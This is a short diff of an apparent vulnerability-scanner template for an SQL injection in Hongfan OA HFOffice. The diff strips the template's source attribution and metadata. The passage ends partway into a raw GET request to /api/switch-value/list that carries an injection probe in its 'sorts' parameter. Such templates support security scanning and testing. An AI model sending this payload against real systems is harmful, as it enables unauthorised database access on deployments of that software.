@@ -3,12 +3,8 @@ info:
   name: 红帆OA HFOffice SQL注入
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rdn7aomg29eivl10'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: rdn7aomg29eivl10
-    fofa: 暂无
 http:
 - raw:
   - 'GET /api/switch-value/list?sorts=%5B%7B%22Field%22:%221-user%22%7D%5D&conditions=%5B%5D&_ZQA_ID=4dc296c6c69905a7 HTTP/1.1
